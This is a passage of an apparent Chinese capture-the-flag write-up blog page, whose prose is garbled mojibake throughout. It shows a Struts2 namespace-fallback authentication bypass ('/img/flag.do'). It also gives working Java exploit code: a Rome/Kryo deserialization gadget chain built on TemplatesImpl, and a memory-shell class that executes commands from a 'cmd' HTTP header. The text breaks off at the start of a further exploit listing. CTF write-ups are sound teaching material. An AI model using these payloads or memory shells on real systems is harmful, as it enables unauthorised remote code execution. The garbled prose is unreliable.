class="name">web-resource-name</span>&gt;</span>flag<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">auth-constraint</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">login-config</span>&gt;</span>          </span><br><span class="line">        <span class="tag">&lt;<span class="name">auth-method</span>&gt;</span>BASIC<span class="tag">&lt;/<span class="name">auth-method</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">login-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨äº†<code>Apache Struts</code>æ¡†æ¶æ¥å¤„ç†æ•´ä¸ªç½‘ç«™ï¼Œ<code>&lt;filter&gt;</code>å’Œ<code>&lt;filter-mapping&gt;</code>ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸ºstruts2çš„è¿‡æ»¤å™¨ï¼Œè¯¥è¿‡æ»¤å™¨ç”¨äºå¤„ç†æ‰€æœ‰çš„URLã€‚<code>&lt;security-constraint&gt;</code>ï¼šå®šä¹‰äº†ä¸¤ä¸ªå®‰å…¨çº¦æŸï¼Œè¿™æ˜¯ä¸ºWebåº”ç”¨ç¨‹åºè®¾ç½®çš„ã€‚ç¬¬ä¸€ä¸ªå®‰å…¨çº¦æŸï¼ˆpass-staticï¼‰æŒ‡å®šäº†èµ„æºé›†åˆï¼Œä¾‹å¦‚&#x2F;img&#x2F;*å’Œ&#x2F;index.jspï¼Œè¿™äº›èµ„æºæ˜¯å…¬å…±èµ„æºï¼Œä¸éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ã€‚ç¬¬äºŒä¸ªå®‰å…¨çº¦æŸï¼ˆinterceptorï¼‰æŒ‡å®šäº†æ‰€æœ‰URLéƒ½éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¿™æ˜¯é€šè¿‡å°†<code>&lt;auth-constraint/&gt;</code>è®¾ç½®ä¸ºç©ºæ¥å®ç°çš„ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯<code>/img/*</code> å’Œ<code> /index.jsp</code>ä¸éœ€è¦è®¤è¯å°±å¯ä»¥è®¿é—®ï¼Œè€Œå…¶ä»–é¡µé¢éƒ½éœ€è¦è®¤è¯</p><p>ä½†ç›®å‰æ²¡æœ‰èƒ½è·å–è®¤è¯æ–¹å¼çš„åŠæ³•ï¼Œç»§ç»­å¾€ä¸‹çœ‹çœ‹</p><p><code>/WEB-INF/classes/struts.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;do&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constant</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.devMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;struts2&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mycompany.helloworld.action.FlagAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/WEB-INF/views/jsp/layouts/flag.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªåä¸ºâ€struts2â€çš„åŒ…ï¼Œç»§æ‰¿äº†Strutsçš„é»˜è®¤åŒ…ï¼ˆstruts-defaultï¼‰ã€‚åœ¨è¯¥åŒ…ä¸­å®šä¹‰äº†ä¸¤ä¸ªè·¯ç”±ï¼Œåˆ†åˆ«ä¸ºâ€indexâ€å’Œâ€flagâ€ï¼Œå…¶ä¸­flagè·¯ç”±å¯¹åº”äº†ä¸€ä¸ªç±»ï¼Œè¯¥ç±»æ“ä½œå°±æ˜¯è¯»å–&#x2F;flagï¼ŒåŒæ—¶å°†è·¯ç”±åç¼€é…ç½®ä¸ºäº†<code>.do</code>,æ‰€ä»¥åªéœ€è®¿é—®flag.doå°±å¯è·å–flag</p><p><a href="https://imgse.com/i/pp6Iby4"><img src="https://s1.ax1x.com/2023/03/28/pp6Iby4.png" alt="pp6Iby4.png"></a></p><p>ä½†åœ¨ä¸Šé¢æˆ‘ä»¬çŸ¥é“struts2çº¦æŸäº†å¯¹è·¯ç”±çš„è®¿é—®ï¼Œåªæœ‰<code>/img/*</code> å’Œ<code> /index.jsp</code>ä¸éœ€è¦è®¤è¯å°±å¯ä»¥è®¿é—®ï¼Œå…¶ä¸­<code>/index.jsp</code>æ—¶é™æ€é¡µé¢æ²¡æœ‰ä»€ä¹ˆä½œç”¨</p><p>å¦‚ä½•åˆ©ç”¨<code>/img/*</code>?</p><p>å‚è€ƒStrutså®˜æ–¹æ–‡æ¡£</p><p><a href="https://struts.apache.org/core-developers/namespace-configuration">https://struts.apache.org/core-developers/namespace-configuration</a></p><p><a href="https://imgse.com/i/pp6IzY6"><img src="https://s1.ax1x.com/2023/03/28/pp6IzY6.png" alt="pp6IzY6.png"></a></p><p>å…¶ä¸­æŒ‡å‡ºï¼ŒStruts2çš„å‘½åç©ºé—´å¹¶ä¸åƒæ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸€æ ·æ˜¯å…·æœ‰å±‚çº§å…³ç³»çš„ï¼Œè€Œæ˜¯åªæœ‰ä¸€ä¸ªå‘½åç©ºé—´å±‚çº§ã€‚æ¯”å¦‚åœ¨è¯·æ±‚URL &#x2F;barspace&#x2F;myspace&#x2F;bar.action ä¸­ï¼Œæ¡†æ¶ä¼šå…ˆæŸ¥æ‰¾å‘½åç©ºé—´ &#x2F;barspace&#x2F;myspaceï¼Œå¦‚æœè¿™ä¸ªå‘½åç©ºé—´ä¸­ä¸å­˜åœ¨æ‰€è¯·æ±‚çš„Actionï¼Œæ¡†æ¶ä¼šç«‹å³å›é€€åˆ°é»˜è®¤å‘½åç©ºé—´ â€œâ€ã€‚è¿™é‡Œçš„ â€œâ€ è¡¨ç¤ºé»˜è®¤å‘½åç©ºé—´ï¼Œè€Œä¸æ˜¯æŒ‡ä¸€ä¸ªç©ºçš„å±‚çº§æˆ–æ–‡ä»¶å¤¹ã€‚</p><p>æ­¤å¤–ï¼Œè¯¥æ®µè¯è¿˜æŒ‡å‡ºï¼Œæ¡†æ¶ä¸ä¼šå°†å‘½åç©ºé—´è§£æä¸ºä¸€ç³»åˆ—çš„â€œæ–‡ä»¶å¤¹â€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‘½åç©ºé—´å¹¶ä¸æ˜¯çœŸå®å­˜åœ¨çš„æ–‡ä»¶å¤¹æˆ–ç›®å½•ï¼Œè€Œåªæ˜¯æ¡†æ¶å†…éƒ¨ç”¨äºæŸ¥æ‰¾Actionçš„ä¸€ä¸ªæ¦‚å¿µã€‚è¿™æ„å‘³ç€ï¼Œåœ¨Struts2åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨å‘½åç©ºé—´æ—¶ï¼Œæˆ‘ä»¬ä¸åº”è¯¥å°†å…¶çœ‹ä½œæ˜¯çœŸå®å­˜åœ¨çš„å±‚çº§ç»“æ„ã€‚</p><p>ä¸¾ä¸ªå…·ä½“çš„ä¾‹å­</p><p>å­˜åœ¨ä¸€ä¸ªURL<code>/myexample/router/test.action</code></p><ul><li><p>é¦–å…ˆåŒ¹é…å‘½åç©ºé—´<code>/myexample/router</code>ï¼Œè‹¥å­˜åœ¨åˆ™åŒ¹é…test.action</p></li><li><p>è‹¥ä¸å­˜åœ¨åˆ™åŒ¹é…å‘½åç©ºé—´<code>/myexample</code>ï¼ŒåŒ¹é…é‡Œé¢çš„test.action</p></li><li><p>è‹¥ä»ç„¶ä¸å­˜åœ¨ï¼Œåˆ™åŒ¹é…é»˜è®¤å‘½åç©ºé—´<code>&quot;&quot;</code>ï¼ŒåŒ¹é…test.action</p></li><li><p>ä¸å­˜åœ¨åˆ™æŠ¥é”™</p></li></ul><p>æ‰€ä»¥<code>/img/flag.do</code>å’Œ<code>/flag.do</code>æœ€ç»ˆç»“æœæ˜¯ä¸€æ ·çš„ &#x3D;&gt; <code>/flag.do</code></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/img/flag.do</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pp6TiCV"><img src="https://s1.ax1x.com/2023/03/28/pp6TiCV.png" alt="pp6TiCV.png"></a></p><h2 id="Babychain"><a href="#Babychain" class="headerlink" title="Babychain"></a>Babychain</h2><p>å…ˆçœ‹<strong>pom.xml</strong></p><p><a href="https://imgse.com/i/ppy864e"><img src="https://s1.ax1x.com/2023/03/27/ppy864e.png" alt="ppy864e.png"></a></p><p>ä¸€ä¸ªRomeä¾èµ–ï¼Œä¸€ä¸ªkryoä¾èµ–</p><p><a href="https://imgse.com/i/ppy8WjI"><img src="https://s1.ax1x.com/2023/03/27/ppy8WjI.png" alt="ppy8WjI.png"></a></p><p>è·¯ç”±é€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œå¯¹ä¼ å…¥çš„headerå‚æ•°<code>kko</code>è¿›è¡Œbase64è§£å¯†åç”¨kryoè¿›è¡Œååºåˆ—åŒ–</p><p>æ—¢ç„¶æœ‰Romeä¾èµ–ï¼Œç›´æ¥ç”¨Romeé“¾å°è¯•æ‰“ä¸€ä¸‹</p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">N1_BabyChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\SpringEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™é‡Œç”¨Kryoæ¥åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="type">Output</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(baos);</span><br><span class="line">        kryo.writeClassAndObject(o, badAttributeValueExpException);</span><br><span class="line">        o.close();</span><br><span class="line">        System.out.println(base64Encode(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœæŠ¥é”™<code>NullPointerException</code>ï¼ŒåŸå› å’Œ<a href="https://gh0st.vip/2023/03/25/Hessian/">Hessian2äºŒæ¬¡ååºåˆ—åŒ–</a>ä¸€æ ·</p><p><a href="https://imgse.com/i/ppywPje"><img src="https://s1.ax1x.com/2023/03/27/ppywPje.png" alt="ppywPje.png"></a></p><p>æ‰€ä»¥è¿™é‡ŒåŒæ ·éœ€è¦<code>SignedObject</code>äºŒæ¬¡ååºåˆ—åŒ–ï¼Œç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œè¿˜éœ€è¦å†™å†…å­˜é©¬</p><p><strong>SpringEvil.Class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 